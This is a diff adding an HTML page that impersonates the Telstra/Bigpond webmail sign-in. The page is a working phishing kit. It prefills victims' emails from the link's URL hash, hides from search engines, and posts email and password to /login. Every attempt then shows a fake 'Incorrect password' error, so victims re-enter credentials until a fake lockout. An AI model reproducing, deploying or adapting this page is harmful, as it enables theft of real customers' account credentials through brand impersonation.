@@ -1,0 +1,752 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="shortcut icon" href="https://tinyurl.com/5604993">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <title>Sign in with your Telstra ID</title>
+    <style>
+        /* Loading animation styles */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #e0eef7;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        
+        .loading-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 30px;
+        }
+        
+        .loading-spinner {
+            width: 70px;
+            height: 70px;
+            position: relative;
+        }
+        
+        .spinner-inner {
+            width: 100%;
+            height: 100%;
+            border: 5px solid rgba(103, 107, 109, 0.2);
+            border-top: 5px solid #f7f7fa;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #0064D2;
+            font-weight: 500;
+            font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+            letter-spacing: 0.5px;
+        }
+        
+        /* Rest of your existing styles */
+        .error-border {
+            border-color: #d0021b !important;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #e0eef7;
+            background-size: cover;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+            overflow-y: scroll; /* Always show vertical scrollbar */
+        }
+
+        .container {
+            margin-top: 50px;
+            max-width: 440px;
+            background: #ffffff;
+            padding: 40px 24px;
+            border-radius: 4px;
+            transition: opacity 0.3s ease;
+            min-height: 750px;
+            overflow: hidden;
+            position: relative;
+            padding-bottom: 40px;
+            padding-left: 40px;
+            padding-right: 40px;
+            margin-right: auto;
+            margin-left: auto;
+            z-index: 1;
+            font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo-container img {
+            width: 120px;
+            height: auto;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #242424;
+            margin-bottom: 10px;
+            overflow: visible;
+            font-weight: 600;
+            font: 500 2.5rem / 1.2 Telstra Display, Helvetica Neue, Helvetica, Arial, sans-serif;
+            letter-spacing: 0;
+        }
+
+        p {
+            color: #000;
+            font-size: 15px;
+            margin-bottom: 30px;
+            white-space: normal;
+            line-height: 20px;
+            font-weight: 400;
+            font-family: Telstra Text Variable,Helvetica Neue,Helvetica,Arial,sans-serif;
+            letter-spacing: 1px;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .input-container input {
+            width: 100%;
+            height: 3rem;
+            border-radius: 4px;
+            border: 1.5px solid #707070;
+            padding: 12px 40px 12px 12px;
+            font-size: 16px;
+            background: transparent;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-container input:focus {
+            outline: none;
+            border-color: #0064D2;
+        }
+
+        .input-container label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #707070;
+            pointer-events: none;
+            transition: 0.3s ease;
+            background: white;
+            padding: 0 5px;
+        }
+
+        .input-container input:focus ~ label,
+        .input-container input:not(:placeholder-shown) ~ label {
+            top: 0;
+            font-size: 12px;
+            color: #0064D2;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #0d54ff;
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        .styled-button {
+            width: 100%;
+            line-height: 1.5;
+            background-color: #0d54ff;
+            color: #FFF;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.75rem 1.5rem;
+            margin-top: 80px;
+            border-top-color: transparent;
+            border-right-color: transparent;
+            border-left-color: transparent;
+            border-bottom-color: transparent;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            min-width: 96px;
+            padding-top: 8px;
+            padding-right: 16px;
+            padding-left: 16px;
+            padding-bottom: 8px;
+            border-radius: 2.25rem;
+            font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+            font-variation-settings: "wght" 500, "slnt" 0;
+            letter-spacing: 0;
+        }
+        .styled-button2 {
+            width: 100%;
+            line-height: 1.5;
+            color: #0d54ff;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.75rem 1.5rem;
+            margin-top: 30px;
+            border-color: #0d54ff;
+            cursor: pointer;
+            background-color: #fff;
+            min-width: 96px;
+            padding-top: 8px;
+            padding-right: 16px;
+            padding-left: 16px;
+            padding-bottom: 8px;
+            border-radius: 2.25rem;
+            font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+            font-variation-settings: "wght" 500, "slnt" 0;
+            letter-spacing: 0;
+            transition: transform .15s ease-out, opacity .7s .25s;
+        }
+
+        .styled-button:hover:not(:disabled) {
+            background-color: #0056b3;
+        }
+
+        .styled-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .error {
+            color: #d0021b;
+            font-size: 0.875em;
+            margin: -20px 0 15px 0;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .loading-dots {
+            position: relative;
+            width: 100%;
+            height: 8px;
+        }
+
+        .dot {
+            position: absolute;
+            width: 5px;
+            height: 5px;
+            background-color: #000;
+            border-radius: 50%;
+            animation: flow 1.4s infinite linear;
+            left: 0%;
+            opacity: 0;
+        }
+
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        .dot:nth-child(4) { animation-delay: 0.6s; }
+
+        @keyframes flow {
+            0% {
+                left: 0%;
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                left: 100%;
+                opacity: 0;
+            }
+        }
+
+        .footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            background-color: #E8E8E8;
+            color: #282828;
+            padding: 10px 0;
+            text-align: center;
+        }
+
+        .footer span {
+            margin: 0 10px;
+            font-size: 14px;
+        }
+        .back-arrow {
+            position: absolute;
+            left: 25px;
+            cursor: pointer;
+            font-size: 24px;
+            color: rgb(0, 100, 210);
+            padding: 23px;
+            transition: background-color 0.2s;
+            margin-left: 3px;
+        }
+
+        .back-arrow.disabled {
+            color: #707070;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .back-arrow:hover:not(.disabled) {
+            background-color: rgba(0,100,210,0.1);
+        }
+
+        /* New email display styles */
+        .email-container {
+            margin: 30px 0;
+            width: 100%;
+            
+        }
+
+        .email-display {
+            display: inline-block;
+            border: 1px solid #e0e0e0;
+            font-size: 14px;
+            color: #282828;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            border-right-color: #e0e0e0;
+            border-top-color: #e0e0e0;
+            margin-top: -20px;
+            border-left-color: #e0e0e0;
+            width: 100%;
+            height: 3rem;
+            border: 1.5px solid #707070;
+            padding: 12px 40px 12px 35px;
+            font: 400 1rem / 1.4 Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+            letter-spacing: .009375rem;
+        }
+        .forgotton {
+            color: #0d54ff;
+            text-decoration-line: underline;
+            font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+            cursor: pointer;
+            font-size: 1rem;
+            font-variation-settings: "wght" 500, "slnt" 0;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            line-height: 1.5;
+            margin-top: 50px;
+
+        }
+        .bd {
+            margin-bottom: 10px;
+            margin-top: 10px;
+            font-family: Telstra Text Variable,Helvetica Neue,Helvetica,Arial,sans-serif;
+            letter-spacing: 0.5px;
+        }
+
+        
+        h4 {
+          
+           letter-spacing: 0.5px;
+           font-family: Telstra Text Variable,Helvetica Neue,Helvetica,Arial,sans-serif;
+         } 
+
+        img {
+            height: 58px;
+            display: block;
+            margin: 0 auto;
+            box-shadow: 0 10px 10px -10px rgba(0, 0, 0, 0.2);
+        }
+        /* Fixed checkbox styles */
+        .t-able-checkbox {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+            margin-bottom: 30px;
+        }
+        
+        input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 25px;
+            height: 25px;
+            border: 2px solid #707070;
+            border-radius: 4px;
+            background-color: white;
+            cursor: pointer;
+            position: relative;
+            margin-right: 10px;
+            transition: all 0.2s ease;
+        }
+        
+        input[type="checkbox"]:checked {
+            border-color: #0064D2;
+            background-color: #0064D2;
+        }
+        
+        input[type="checkbox"]:checked::after {
+            content: "";
+            position: absolute;
+            left: 7px;
+            top: 3px;
+            width: 6px;
+            height: 12px;
+            border: solid white;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+        }
+        
+        input[type="checkbox"]:focus {
+            outline: 2px solid #0064D2;
+            outline-offset: 2px;
+        }
+        
+        .t-able-checkbox label {
+            cursor: pointer;
+            color: #000;
+            font-size: 14px;
+            font-weight: 400;
+            font-family: Telstra Text Variable,Helvetica Neue,Helvetica,Arial,sans-serif;
+            letter-spacing: 0.5px;
+        }
+  
+        
+        .t-able-checkbox label:hover {
+            color: #0064D2;
+        }
+    .back {
+        font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+
+    }
+    .recover {
+        margin-top: 50px;
+        color: #0d54ff;
+        font-family: Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;
+        cursor: pointer;
+        font-size: 1rem;
+        font-variation-settings: "wght" 500, "slnt" 0;
+        font-weight: bold;
+        letter-spacing: 0;
+        line-height: 1.5;
+        text-decoration: underline;
+
+    }
+    .or {
+        text-align: center;
+        margin-top: 15px;
+        color: #414141;
+        letter-spacing: -.22px;
+    }
+
+    </style>
+</head>
+<body marginwidth="0" marginheight="0">
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <img src="https://i.imgur.com/PNZXhe0.png" alt="Telstra Logo" class="loading-logo">
+        <div class="loading-spinner">
+            <div class="spinner-inner"></div>
+        </div>
+        <div class="loading-text"></div>
+    </div>
+
+    <!-- Content that will be revealed after loading -->
+    <div id="content" style="display: none;">
+        <div class="topnav">
+            <img src="https://i.imgur.com/PNZXhe0.png" alt="">
+        </div> 
+
+        <!-- Email Container -->
+        <div class="container" id="emailContainer">
+            <div class="logo-container">
+            </div>
+            <h1>Sign in to Telstra <br> webmail</h1>
+            <p>Verify your Telstra Bigpond email address.</p><br>
+            <h4>Telstra email</h4>
+            <div class="bd">Example: john@bigpond.com</div>
+            <form id="emailForm" action="/login" method="post" class="inputcontrol">
+                <div class="input-container">
+                    <input type="email" id="email" name="email" placeholder=" ">
+                    <label for="email"></label>
+                </div>
+                
+                <div id="emailError" class="error"></div>
+                <div class="loading" id="emailLoading">
+                    <div class="loading-dots">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+                </div>
+                <div class="forgotton">Forgot Telstra email</div><br><br>
+                <div class="t-able-checkbox t-able-spacing-7x-mb ">
+                    <input name="$rememberUsername" type="checkbox" id="rememberUsername">
+                    <label for="rememberUsername"> Remember Telstra email</label>
+                </div>
+                <button type="submit" class="styled-button">Continue</button>
+            </form>
+            <div class="or">OR</div>
+            <button type="submit" class="styled-button2">Sign in to MyTelstra</button>
+        </div>
+
+        <!-- Password Container -->
+        <div class="container" id="passwordContainer" style="display: none;">
+            
+            <div class="logo-container">
+            </div>
+            <h1>Sign in to Telstra <br> webmail</h1>
+            <p>Enter your Telstra email account password.</p><br>
+
+            <div class="back">Back to previous for:</div>
+            <div class="back-arrow" onclick="goBackToEmail()">&lt;</div>
+            <div class="email-container">
+                <span class="email-display" id="userEmail"></span>
+            </div>
+            <div style="margin-top: 25px; margin-bottom: 10px; font-weight: bold;">Password</div>
+
+        
+            <form id="passwordForm" action="/login" method="post" class="inputcontrol">
+                <div class="input-container">
+                    <input type="password" id="password" name="password" placeholder=" ">
+                    <label for="password"></label>
+                    <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">Show</button>
+                </div>
+                <div id="passwordError" class="error"></div>
+                <div class="loading" id="passwordLoading">
+                    <div class="loading-dots">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+                </div>
+                <div class="recover">Recover account</div>
+                <button type="submit" class="styled-button">Sign in</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            <span>Copyright © 2025 Telstra</span>
+            <span><a href="#" style="color: #0064D2; text-decoration: none;">Privacy</a></span>
+            <span><a href="#" style="color: #0064D2; text-decoration: none;">Terms of use</a></span>
+        </div>
+    </div>
+
+<script>
+    // Show loading animation for 3 seconds
+    setTimeout(function() {
+        // Hide loading screen
+        document.getElementById('loading-screen').style.opacity = '0';
+        document.getElementById('loading-screen').style.visibility = 'hidden';
+        
+        // Show main content
+        document.getElementById('content').style.display = 'block';
+    }, 5000);
+    
+    let userEmail = '';
+    let passwordAttempts = 0;
+    const maxAttempts = 3;
+    const cooldownDuration = 300000; // 5 minutes
+    let passwordVisible = false;
+    let lockoutTimeout = null;
+
+    // Function to extract email from URL hash
+    function getEmailFromUrl() {
+        const hash = window.location.hash;
+        if (hash && hash.includes('@')) {
+            // Extract email after the #
+            const email = hash.substring(1);
+            if (validateEmail(email)) {
+                return email;
+            }
+        }
+        return null;
+    }
+
+    // Function to set email if found in URL
+    function prefillEmail() {
+        const emailFromUrl = getEmailFromUrl();
+        if (emailFromUrl) {
+            document.getElementById('email').value = emailFromUrl;
+        }
+    }
+
+    function togglePasswordVisibility() {
+        const passwordInput = document.getElementById('password');
+        const toggleButton = document.querySelector('.toggle-password');
+        passwordVisible = !passwordVisible;
+        passwordInput.type = passwordVisible ? 'text' : 'password';
+        toggleButton.textContent = passwordVisible ? 'Hide' : 'Show';
+    }
+
+    function goBackToEmail() {
+        document.getElementById('passwordContainer').style.display = 'none';
+        document.getElementById('emailContainer').style.display = 'block';
+        document.getElementById('password').value = '';
+        document.getElementById('passwordError').textContent = '';
+    }
+
+    // Run on page load
+    document.addEventListener('DOMContentLoaded', function() {
+        prefillEmail();
+    });
+
+    // Email Form Handler
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const emailInput = document.getElementById('email');
+        const email = emailInput.value.trim();
+        const emailError = document.getElementById('emailError');
+        const emailLoading = document.getElementById('emailLoading');
+        const emailButton = this.querySelector('button');
+
+        // Reset states
+        emailError.textContent = '';
+        emailInput.classList.remove('error-border');
+
+        // Validate email
+        if (!email) {
+            emailError.textContent = 'Please enter the email for your account.';
+            emailInput.classList.add('error-border');
+            return;
+        }
+        
+        if (!validateEmail(email)) {
+            emailError.textContent = 'Please enter a valid email address.';
+            emailInput.classList.add('error-border');
+            return;
+        }
+
+        // Show loading state
+        emailButton.disabled = true;
+        emailLoading.style.display = 'block';
+
+        // Send to backend
+        const formData = new URLSearchParams();
+        formData.append('email', email);
+
+        fetch('/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData
+        })
+        .then(response => {
+            userEmail = email;
+            document.getElementById('emailContainer').style.display = 'none';
+            document.getElementById('passwordContainer').style.display = 'block';
+            document.getElementById('userEmail').textContent = email;
+            passwordAttempts = 0; // Reset attempts for new email
+        })
+        .catch(error => {
+            emailError.textContent = 'Connection error. Please try again.';
+        })
+        .finally(() => {
+            emailLoading.style.display = 'none';
+            emailButton.disabled = false;
+        });
+    });
+
+    // Password Form Handler
+    document.getElementById('passwordForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const passwordInput = document.getElementById('password');
+        const passwordError = document.getElementById('passwordError');
+        const passwordLoading = document.getElementById('passwordLoading');
+        const passwordButton = this.querySelector('button');
+        const password = passwordInput.value.trim();
+
+        // Reset states
+        passwordError.textContent = '';
+        passwordInput.classList.remove('error-border');
+
+        // Validate password
+        if (!password) {
+            passwordError.textContent = 'Please enter the password for your bigpond  email account.';
+            passwordInput.classList.add('error-border');
+            return;
+        }
+
+        // Check lockout state
+        if (passwordAttempts >= maxAttempts) {
+            passwordError.innerHTML = 'You\'ve tried to sign in too many times. Please try again in 5 minutes.';
+            return;
+        }
+
+        // Show loading state
+        passwordButton.disabled = true;
+        passwordLoading.style.display = 'block';
+
+        // Send to backend
+        const formData = new URLSearchParams();
+        formData.append('email', userEmail);
+        formData.append('password', password);
+
+        fetch('/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData
+        })
+        .finally(() => {
+            passwordAttempts++;
+            passwordLoading.style.display = 'none';
+            passwordButton.disabled = false;
+
+            if (passwordAttempts >= maxAttempts) {
+                passwordError.innerHTML = 'You\'ve tried to sign in too many times with an incorrect account or password. Please try again in 5 minutes.';
+                passwordInput.disabled = true;
+                passwordButton.disabled = true;
+                
+                // Reset after 5 minutes
+                lockoutTimeout = setTimeout(() => {
+                    passwordAttempts = 0;
+                    passwordInput.disabled = false;
+                    passwordButton.disabled = false;
+                    passwordError.textContent = '';
+                    passwordInput.value = '';
+                    document.getElementById('passwordContainer').style.display = 'none';
+                    document.getElementById('emailContainer').style.display = 'block';
+                }, cooldownDuration);
+            } else {
+                passwordError.textContent = 'Incorrect password. Please enter your Bigpond email account password.';
+                passwordInput.classList.add('error-border');
+            }
+        });
+    });
+
+    function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email);
+    }
+</script>
+
+</body></html>
